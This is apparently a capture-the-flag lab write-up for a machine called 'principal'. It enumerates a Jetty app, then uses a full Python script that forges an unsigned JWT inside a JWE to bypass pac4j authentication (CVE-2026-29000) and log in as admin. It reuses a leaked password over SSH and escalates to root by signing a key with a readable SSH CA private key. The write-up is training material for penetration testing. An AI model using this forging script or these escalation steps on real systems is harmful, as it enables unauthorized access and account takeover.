---
layout: post
title: "principal"
date: 2026-03-23 
categories: LainKusanagi OSCP
---

# Summary

- Port 8080 serving application powered by pac4j; research recent exploit; CVE-2026-29000
- read static/js/app.js to find API endpoints and JWT claims schema
- verify jwks endpoint containing RSA public key; read app.js for claims schema + encryption method
- create custom script to forget token; logged in as admin
- found password for svc-deploy; part of deployer group
- deployer group has privilege to read ca private key; forge our own root key signed by ca; ssh as root

# Attack Path

Enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/principal 10.129.9.146

22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
|_http-server-header: Jetty
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Date: Sun, 15 Mar 2026 15:53:56 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: application/json
|     {"timestamp":"2026-03-15T15:53:56.415+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest:
|     HTTP/1.1 302 Found
|     Date: Sun, 15 Mar 2026 15:53:55 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Content-Language: en
|     Location: /login
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sun, 15 Mar 2026 15:53:56 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch:
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Sun, 15 Mar 2026 15:53:56 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 349
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 505 Unknown Version</title>
|
```

Let’s visit the jetty application. 

![image.png]({{ site.baseurl }}/assets/principal/image.png)

We see the version of the application at the bottom and says powered by pac4j. Searchin up pac4j exploit, we come across this page: https://github.com/kernelzeroday/CVE-2026-29000

![image.png]({{ site.baseurl }}/assets/principal/image%201.png)

Let’s clone the repo:

 git clone https://github.com/kernelzeroday/CVE-2026-29000.git

setup:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Let’s try:

```bash
python -m token_forge --jwks-url http://10.129.9.146:8080/.well-known/jwks.json --subject admin
```

Did not work. Let’s manually see if the page exists:

![image.png]({{ site.baseurl }}/assets/principal/image%202.png)

Let’s fuzz:

```bash
feroxbuster -u http://10.129.9.146:8080

404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      707l     1287w    12691c http://10.129.9.146:8080/static/css/style.css
501      GET        1l       10w      110c http://10.129.9.146:8080/reset-password
200      GET      308l      939w    10949c http://10.129.9.146:8080/static/js/app.js
200      GET        4l       22w      272c http://10.129.9.146:8080/static/img/favicon.svg
302      GET        0l        0w        0c http://10.129.9.146:8080/ => http://10.129.9.146:8080/login
200      GET      112l      373w     6152c http://10.129.9.146:8080/login
500      GET        1l        1w       73c http://10.129.9.146:8080/error
500      GET        0l        0w        0c http://10.129.9.146:8080/WEB-INF
200      GET       94l      214w     3930c http://10.129.9.146:8080/dashboard
500      GET        0l        0w        0c http://10.129.9.146:8080/META-INF
500      GET        0l        0w        0c http://10.129.9.146:8080/web-inf
400      GET       15l       27w      375c http://10.129.9.146:8080/error%1F_log

```

Looking at the static/js/app.js, we find potential routes:

```bash
<SNIP>
const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';

// Role constants - must match server-side role definitions
const ROLES = {
    ADMIN: 'ROLE_ADMIN',
    MANAGER: 'ROLE_MANAGER',
    USER: 'ROLE_USER'
};
```

We fin teh JWKS endpoint. Let’s try visiting:

```bash
http://10.129.9.146:8080/api/auth/jwks

{"keys":[{"kty":"RSA","e":"AQAB","kid":"enc-key-1","n":"lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"}]}
```

Now let’s try again. We also notice that the admin has ROLE_ADMIN, let’s add that and ROLE_MANAGER.

```bash
python -m token_forge --jwks-url http://10.129.9.146:8080/api/auth/jwks --subject admin --roles "ROLE_ADMIN,ROLE_MANAGER"

2026-03-15 12:33:25,289 INFO [token_forge.cli] subject=admin roles=['ROLE_ADMIN', 'ROLE_MANAGER'] exp_sec=3600 extra_claims=[]
2026-03-15 12:33:25,388 INFO [token_forge.cli] loaded key from jwks_url=http://10.129.9.146:8080/api/auth/jwks
2026-03-15 12:33:25,391 INFO [token_forge.cli] token_len=633 token_prefix=eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIn0.C_0p9A-nqEe0...

eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIn0.C_0p9A-nqEe0e3mIuIzAE2aV32hROchEc0CMzNN9yWGeEAaPQgf_Nqiv3iPoptjyKnleFktJPY8hBO4w3PrJUJh3qf56AdpsdKp7YcZLAnwZm9JCVCwfQnXljGgxNJzpS3MLm3qCB5WARbnibQe_Uw2uRlZYLoHevItDDq_eLmSj2NNzCVnHSfQ89htt-BmPqJVAy6RI-Pa9ZlLKO_VH2RTNSJ2gz8jcWpVCDuveAfoMlUuRB5VAaiqS7J97_wIpxXw0N8UBUO5Y5NQ4TahBoIZ30HV2-YITQfGND9oC2wlSxrKZXgAQCi3VMg_N66-EEdt5NF-sJ21O7fmWkLmQdA.AOJCD8bGih6MfbEb.oRD_n6_1ATnDr6SkuC4QnFZP265zvw9KlnoDFuwuJFYiP-XshxaLE5qA-OM-drsVJsvG7Tvdz-ja_OKS-SYJdMyPelWhKyBXQdoFqa0pMW9vYxnDC5bUn1p-ODvg--MSeImld75CEycK4GbN8mUEAT0c25mEGcqiWRvPUho0nMXQBrccav0h1A.5cl7gIB1EWmEj-j3A0_j7w

```

Now let’s add that token in Authorization: Bearer

```bash
GET /dashboard HTTP/1.1
Host: 10.129.9.146:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Authorization: Bearer eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIn0.C_0p9A-nqEe0e3mIuIzAE2aV32hROchEc0CMzNN9yWGeEAaPQgf_Nqiv3iPoptjyKnleFktJPY8hBO4w3PrJUJh3qf56AdpsdKp7YcZLAnwZm9JCVCwfQnXljGgxNJzpS3MLm3qCB5WARbnibQe_Uw2uRlZYLoHevItDDq_eLmSj2NNzCVnHSfQ89htt-BmPqJVAy6RI-Pa9ZlLKO_VH2RTNSJ2gz8jcWpVCDuveAfoMlUuRB5VAaiqS7J97_wIpxXw0N8UBUO5Y5NQ4TahBoIZ30HV2-YITQfGND9oC2wlSxrKZXgAQCi3VMg_N66-EEdt5NF-sJ21O7fmWkLmQdA.AOJCD8bGih6MfbEb.oRD_n6_1ATnDr6SkuC4QnFZP265zvw9KlnoDFuwuJFYiP-XshxaLE5qA-OM-drsVJsvG7Tvdz-ja_OKS-SYJdMyPelWhKyBXQdoFqa0pMW9vYxnDC5bUn1p-ODvg--MSeImld75CEycK4GbN8mUEAT0c25mEGcqiWRvPUho0nMXQBrccav0h1A.5cl7gIB1EWmEj-j3A0_j7w

```

However, this doesn’t work. After analysing the app.js some more, we realise we had two problems:

Problem 1 — wrong claim name for roles. token_forge puts roles into $int_roles (its internal format), but app.js explicitly documents the server expects role (singular string).

Problem 2 — missing iss claim. app.js documents iss: "principal-platform" is required, but token_forge doesn't add it by default.

● Found two more bugs in the tool itself that can't be fixed via CLI flags:

1. Wrong enc algorithm — token_forge uses A256GCM but app.js says the server uses A128GCM
2. Malformed PlainJWT — serialize_plain_jwt returns header.payload but a valid PlainJWT needs a trailing dot: header.payload.

```bash
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
```

Our attack path outlined:

1. App exposes RSA public key at /api/auth/jwks

2. Craft an unsigned PlainJWT (alg: none) with arbitrary claims (sub: admin, role: ROLE_ADMIN)

3. Encrypt it inside a JWE container using the public key (RSA-OAEP-256)

4. Server decrypts the JWE, but fails to enforce that the inner JWT is unsigned — skips signature verification

5. Server accepts the forged identity and issues access

Create our own script:

```bash
#!/usr/bin/env python3
import time, json, base64, requests
from jwcrypto import jwe, jwk

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Fetch public key from JWKS
jwks = requests.get("http://10.129.9.146:8080/api/auth/jwks").json()
key = jwk.JWK(**jwks["keys"][0])

# Build PlainJWT claims
claims = {
    "sub": "admin",
    "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}

# Serialize as PlainJWT (alg=none) with trailing dot
header = b64url(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
payload = b64url(json.dumps(claims, separators=(",", ":")).encode())
plain_jwt = f"{header}.{payload}."  # trailing dot = empty signature

# Wrap in JWE using A128GCM (matching server expectation)
protected = {"alg": "RSA-OAEP-256", "enc": "A128GCM", "cty": "JWT"}
token = jwe.JWE(plain_jwt.encode(), recipient=key, protected=protected)
print(token.serialize(compact=True))
```

Now forge the token:

```bash
python3 forge.py

eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMTI4R0NNIn0.LyTdUxdpQXqyr6MzcUM5Py8JJ-eaXUDo6sydTyeFnengwaxlePKPxdRiPYCT-D3b5X0gjUaqEif
H783X39Fj5NDb7TmtZFl2xpRcYiOlNmSHrSQr6rf0pdimL7YJouX8WCb3FzbWRj9ehylmRBxhIPtJcsfe6bU0czW0ShvRJBkAKmMtpB62_2GEZYMARnwpXyGV5wMF1KwEtrubs48H8ectCa
1Y_i0nlPXEUI1Ks1z-AV-XD9Pl5dpmKoncZzliIimZL7Os3qoxygMWsYi9e5vMDhMk8lsPoG2Sf68-s-fz1Vo4PlXbvBt5y766x8T52F0GfXTpu71DeGwY6SKXrA.UYMDjCwidYfgcNjx.W
FATqhnlilYR8KNuy7wRb94JWzMDNy4hYQvUdY9C0LdHfQqYEqmOOUAIF6Mq80--xAnX1iQJ0ReQWEI1KxIVnT5L07hj8QByavrW_VfzKXNRLpP9z77fEBvRC8E_6i7sB51Axuq98dxU3c1O
uCGtwXsR1dB5bngYYgmulxDSHjjaoq9c7pvWRurdWbAP5byLezE0vMatuiWDjo1-gRxpGd4_0kmH.n6wi_K-YDdxD-IKob4Qkqw
```

Let’s copy and paste the token in the session storage, creating a new auth_token

![image.png]({{ site.baseurl }}/assets/principal/image%203.png)

Now, let’s visit dashboard

![image.png]({{ site.baseurl }}/assets/principal/image%204.png)

We are in. 

Looking in settings, we find this: 

![image.png]({{ site.baseurl }}/assets/principal/image%205.png)

```bash
D3pl0y_$$H_Now42!
```

![image.png]({{ site.baseurl }}/assets/principal/image%206.png)

Notes suggest svc_deploy might be using the encryptionKey password. Let’s try:

```bash
ssh svc-deploy@10.129.9.146
```

We are in:

![image.png]({{ site.baseurl }}/assets/principal/image%207.png)

No sudo privs:

```bash
svc-deploy@principal:~$ sudo -l
[sudo] password for svc-deploy: 
Sorry, try again.
[sudo] password for svc-deploy: 
Sorry, user svc-deploy may not run sudo on principal.

```

Part of deployers group:

```bash
id

uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

Let’s see what files our group is associated to:

```bash
find / -group deployers 2>/dev/null

/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca
```

```bash
svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub

svc-deploy@principal:~$ ls -l /opt/principal/ssh
total 12
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub

```

With this information, let’s break down our attack path.

- SSH normally uses key pairs (your public key must be in ~/.ssh/authorized_keys on the server). SSH CAs work differently — instead of trusting individual keys, the server trusts any key signed by the CA.
- TrustedUserCAKeys /opt/principal/ssh/ca.pub means: "trust any SSH certificate signed by the private key matching ca.pub"
- We have read access to ca (the CA private key) via the deployers group. This means you can sign any public key and SSH as any user including root.

Let’s generate a throwaway keypair:

```bash
ssh-keygen -t ed25519 -f /tmp/id_pwn -N ""
```

Now sign it with the CA, setting principal to root:

```bash
ssh-keygen -s /opt/principal/ssh/ca -I "anything" -n root -V +1h /tmp/id_pwn.pub

Signed user key /tmp/id_pwn-cert.pub: id "anything" serial 0 for root valid from 2026-03-15T17:30:00 to 2026-03-15T18:31:56
```

Now let’s try logging in:

```bash
ssh -i /tmp/id_pwn root@localhost
```

![image.png]({{ site.baseurl }}/assets/principal/image%208.png)

We are root.